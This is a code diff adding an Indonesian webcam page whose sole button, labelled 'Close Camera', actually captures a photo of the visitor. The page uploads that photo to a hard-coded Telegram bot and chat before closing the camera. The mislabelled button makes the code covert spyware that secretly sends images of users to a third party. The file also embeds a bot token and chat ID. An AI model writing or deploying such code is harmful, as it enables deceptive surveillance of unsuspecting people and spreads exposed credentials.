@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Webcam + Kirim ke Telegram</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f0f0;
+      margin: 0;
+      gap: 20px;
+      font-family: system-ui, Arial, sans-serif;
+    }
+    video {
+      border: 2px solid #333;
+      border-radius: 8px;
+      width: 640px;
+      height: 480px;
+      background-color: black;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #status { font-size: 14px; color: #333; }
+  </style>
+</head>
+<body>
+  <video id="webcam" autoplay playsinline></video>
+  <div>
+    <button id="closeCam">Tutup Kamera</button>
+  </div>
+  <div id="status"></div>
+
+  <script>
+  (function () {
+    const video = document.getElementById('webcam');
+    const btnClose = document.getElementById('closeCam');
+    const statusEl = document.getElementById('status');
+
+    const BOT_TOKEN = '8293310918:AAGvKyYkz4KevYkE2L-M1OUaTEgJ__I0QmA'; 
+
+    const CHAT_ID = '1598387519'; 
+
+    let stream = null;
+
+    async function openCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        video.srcObject = stream;
+        video.play();
+        statusEl.textContent = 'Kamera aktif';
+        btnClose.disabled = false;
+      } catch (err) {
+        console.error('Gagal membuka kamera:', err);
+        statusEl.textContent = 'Gagal membuka kamera: ' + err.message;
+      }
+    }
+
+    function stopCamera() {
+      if (!stream) return;
+      const tracks = stream.getTracks();
+      tracks.forEach(t => t.stop());
+      video.srcObject = null;
+      stream = null;
+      statusEl.textContent = 'Kamera ditutup';
+      btnClose.disabled = true;
+    }
+
+    async function captureFrameAsBlob() {
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+      const canvas = document.createElement('canvas');
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, w, h);
+      return new Promise(resolve => {
+        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
+      });
+    }
+
+    async function sendPhotoToTelegram(blob) {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', blob, 'snapshot.jpg');
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+      const res = await fetch(url, { method: 'POST', body: fd });
+      const json = await res.json();
+      if (!json.ok) throw new Error(JSON.stringify(json));
+      return json;
+    }
+
+    btnClose.addEventListener('click', async () => {
+      btnClose.disabled = true;
+      try {
+        if (!stream) await openCamera();
+        await new Promise(r => setTimeout(r, 300));
+        const blob = await captureFrameAsBlob();
+        await sendPhotoToTelegram(blob);
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = 'Gagal: ' + (err.message || err);
+        btnClose.disabled = false;
+      } finally {
+        stopCamera();
+      }
+    });
+
+    openCamera();
+  })();
+  </script>
+</body>
+</html>
